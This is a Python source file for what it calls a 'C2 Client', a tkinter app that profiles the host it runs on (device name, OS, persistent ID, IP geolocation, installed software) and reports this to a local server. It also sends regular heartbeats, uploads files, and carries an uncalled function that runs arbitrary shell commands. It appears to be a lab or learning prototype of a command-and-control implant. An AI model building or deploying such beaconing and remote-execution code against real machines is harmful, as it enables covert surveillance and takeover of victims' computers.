import tkinter as tk
import platform
import os
import uuid
from tkinter import ttk, messagebox, filedialog
import requests
import subprocess


SERVER_URL = 'http://localhost:5000'

class ClientApp:
    def __init__(self, root):
        self.root = root
        self.root.title("C2 Client")

        self.device_name = platform.node()
        self.os_version = f"{platform.system()} {platform.release()}"
        self.hardware_id = self.load_hardware_id()
        self.geo_location = self.get_geolocation()
        self.installed_apps = self.get_installed_apps()

        # ttk.Label(root, text=f"Device Name: {self.device_name}").grid(column=0, row=0, padx=10, pady=5)
        # ttk.Label(root, text=f"OS Version: {self.os_version}").grid(column=0, row=1, padx=10, pady=5)
        # ttk.Label(root, text=f"Geo location: {self.geo_location}").grid(column=0, row=2, padx=10, pady=5)
        # ttk.Label(root, text=f"Hardware id: {self.hardware_id}").grid(column=0, row=3, padx=10, pady=5)

        self.server_status_label = ttk.Label(root, text="Checking server...", foreground="orange")
        self.server_status_label.grid(column=0, row=0, padx=10, pady=5)

        self.status_indicator = tk.Canvas(root, width=20, height=20)
        self.status_indicator.grid(column=0, row=2)

        ttk.Button(root, text="Upload a file", command=self.upload_file).grid(column=0, row=1, columnspan=2, padx=20, pady=10)

        ttk.Button(root, text="Quit", command=root.quit).grid(column=0, row=2, columnspan=2, padx=20, pady=10)

        self.print_all()
        self.check_server()
        self.add_device()
        self.send_heartbeat()

    def add_device(self):
        try:
            data = {
                'device_name': self.device_name, 
                'os_version': self.os_version,
                'hardware_id': self.hardware_id,
                'geo_location': self.geo_location,
                'installed_apps': self.installed_apps
            }
            response = requests.post(f"{SERVER_URL}/device", json=data)
            
            if response.status_code == 201:
                print("Device added!")
            elif response.status_code == 400 and 'already exists' in response.text:
                print("Device already exists.")
            else:
                messagebox.showerror("Error", f"Failed to add device: {response.text}")
        except Exception as e:
            print(f"Could not connect to the server: {e}")

    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Error executing command: {e}"


    def upload_file(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            try:
                files = {'file': open(file_path, 'rb')}
                data = {'hardware_id': self.hardware_id}
                response = requests.post(f"{SERVER_URL}/upload", files=files, data=data)
                
                if response.status_code == 200:
                    messagebox.showinfo("Success", "File uploaded successfully!")
                else:
                    messagebox.showerror("Error", f"Failed to upload file: {response.text}")
            except Exception as e:
                messagebox.showerror("Error", f"Error uploading file: {e}")

    def get_installed_apps(self):
        if platform.system() == 'Windows':
            try:
                result = subprocess.run(['wmic', 'product', 'get', 'name'], stdout=subprocess.PIPE, check=True)
                installed_apps = result.stdout.decode('utf-8').split('\n')
                return [app.strip() for app in installed_apps if app.strip()]
            except subprocess.CalledProcessError as e:
                return [f"Error getting apps from Windows: {e}"]
            except Exception as e:
                return [f"Unexpected error on Windows: {e}"]

        elif platform.system() == 'Linux':
            try:
                result = subprocess.run(['dpkg', '--get-selections'], stdout=subprocess.PIPE, check=True)
                installed_apps = result.stdout.decode('utf-8').split('\n')
                # Filter installed apps marked as "install"
                installed_apps = [app.split()[0] for app in installed_apps if "install" in app]
                return installed_apps[:10]  # Limit to first 10 apps, or remove this if you want all
            except subprocess.CalledProcessError as e:
                return [f"Error getting apps from Linux: {e}"]
            except Exception as e:
                return [f"Unexpected error on Linux: {e}"]

        else:
            return ["Installed apps retrieval is not supported on this OS."]

    def get_geolocation(self):
        try:
            response = requests.get('https://ipinfo.io')
            location_data = response.json()
            return location_data['loc']
        except Exception as e:
            return f"Error retrieving location: {e}"

    def check_server(self):
        try:
            response = requests.get(f"{SERVER_URL}/ping")
            if response.status_code == 200:
                self.status_indicator.create_oval(5, 5, 20, 20, fill="green")
                self.server_status_label.config(text="Server is running", foreground="green")
                print("Server ping sent")
            else:
                self.status_indicator.create_oval(5, 5, 20, 20, fill="red")
                self.server_status_label.config(text="Server is not available", foreground="red")
        except Exception as e:
            self.server_status_label.config(text="Server is not available", foreground="red")

        self.root.after(30000, self.check_server)

    def get_device_id(self):
        device_id = uuid.uuid1()
        return str(device_id)
    
    def load_hardware_id(self):
        hardware_id_file = 'hardware_id.txt'
        if os.path.exists(hardware_id_file):
            with open(hardware_id_file, 'r') as file:
                return file.read().strip()
        else:
            new_hardware_id = self.get_device_id()
            with open(hardware_id_file, 'w') as file:
                file.write(new_hardware_id)
            return new_hardware_id

    def send_heartbeat(self):
        try:
            response = requests.post(f"{SERVER_URL}/device/heartbeat", json={"hardware_id": self.hardware_id})
            if response.status_code == 200:
                print("Heartbeat sent")
            else:
                print("Failed to send heartbeat")
        except:
            print("Server not available")

        self.root.after(10000, self.send_heartbeat)


    def print_all(self):
        print(self.device_name)
        print(self.os_version)
        print("hardware_id", self.hardware_id)
        print(self.geo_location)
        print(self.installed_apps)


if __name__ == "__main__":
    root = tk.Tk()
    app = ClientApp(root)
    root.mainloop()
